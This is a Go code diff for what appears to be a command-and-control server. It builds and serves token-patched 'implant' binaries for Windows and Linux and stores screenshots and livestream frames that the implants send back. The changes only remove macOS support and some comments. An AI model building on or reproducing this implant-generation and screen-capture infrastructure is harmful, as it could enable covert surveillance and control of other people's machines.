@@ -25,14 +25,12 @@ const (
 
 	baseClientWindowsRel = "binaries/base_client_windows.exe"
 	baseClientLinuxRel   = "binaries/base_client_linux"
-	baseClientMacOSRel   = "binaries/base_macos"
 	baseClientRel        = "binaries/base_client"
 )
 
 var (
 	baseClientWindowsPath string
 	baseClientLinuxPath   string
-	baseClientMacOSPath   string
 	baseClientPathOld     string
 )
 
@@ -52,14 +50,9 @@ func init() {
 		fmt.Printf("WARNING: Linux base binary not found at: '%s'. This must exist for implant generation.\n", baseClientLinuxPath)
 	}
 
-	baseClientMacOSPath = filepath.Join(wd, baseClientMacOSRel)
-	if _, err := os.Stat(baseClientMacOSPath); os.IsNotExist(err) {
-		fmt.Printf("WARNING: macOS base binary not found at: '%s'. This must exist for implant generation.\n", baseClientMacOSPath)
-	}
-
 	baseClientPathOld = filepath.Join(wd, baseClientRel)
 
-	fmt.Printf("CONTROLLER.init: Base paths configured. Windows: %s, Linux: %s, macOS: %s\n", baseClientWindowsPath, baseClientLinuxPath, baseClientMacOSPath)
+	fmt.Printf("CONTROLLER.init: Base paths configured. Windows: %s, Linux: %s\n", baseClientWindowsPath, baseClientLinuxPath)
 }
 
 func saveLivestreamFrameToFile(implantToken string, base64Data string) (string, error) {
@@ -78,7 +71,7 @@ func saveLivestreamFrameToFile(implantToken string, base64Data string) (string, 
 	filename := fmt.Sprintf("livestream_frame_%d.png", time.Now().UnixNano())
 	filePath := filepath.Join(implantScreenshotsDir, filename)
 
-	if err := os.WriteFile(filePath, imgBytes, 0640); err != nil { // rw-r-----
+	if err := os.WriteFile(filePath, imgBytes, 0640); err != nil {
 		return "", fmt.Errorf("failed to write screenshot to file '%s': %w", filePath, err)
 	}
 
@@ -234,7 +227,7 @@ func saveScreenshotToFile(implantToken string, commandID int, base64Data string)
 	filename := fmt.Sprintf("screenshot_cmd%d_%d.png", commandID, time.Now().UnixNano())
 	filePath := filepath.Join(implantScreenshotsDir, filename)
 
-	if err := os.WriteFile(filePath, imgBytes, 0640); err != nil { // rw-r-----
+	if err := os.WriteFile(filePath, imgBytes, 0640); err != nil {
 		return "", fmt.Errorf("failed to write screenshot to file '%s': %w", filePath, err)
 	}
 
@@ -299,10 +292,10 @@ func GenerateImplant(c *gin.Context) {
 	userID := userIfc.(int)
 
 	var req struct {
-		TargetOS string `json:"target_os" binding:"required,oneof=windows linux macos"`
+		TargetOS string `json:"target_os" binding:"required,oneof=windows linux"`
 	}
 	if err := c.ShouldBindJSON(&req); err != nil {
-		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request: 'target_os' (windows/linux/macos) is required. " + err.Error()})
+		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid request: 'target_os' (windows/linux) is required. " + err.Error()})
 		return
 	}
 
@@ -545,7 +538,7 @@ func DownloadImplant(c *gin.Context) {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": fmt.Sprintf("Legacy base binary not found on server at %s", baseClientPathOld)})
 		return
 	}
-	baseBinaryData, err := os.ReadFile(baseClientPathOld) // Uses baseClientPathOld
+	baseBinaryData, err := os.ReadFile(baseClientPathOld)
 	if err != nil {
 		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read (legacy) base client binary: " + err.Error()})
 		return
@@ -567,7 +560,7 @@ func DownloadImplant(c *gin.Context) {
 	copy(paddedToken, []byte(implantDBUniqueToken))
 	copy(patchedData[idx:], paddedToken)
 
-	outName := fmt.Sprintf("implant_legacy_%s.bin", implantDBUniqueToken) // Generic extension
+	outName := fmt.Sprintf("implant_legacy_%s.bin", implantDBUniqueToken)
 	c.Header("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", outName))
 	c.Header("Content-Type", "application/octet-stream")
 	c.Data(http.StatusOK, "application/octet-stream", patchedData)
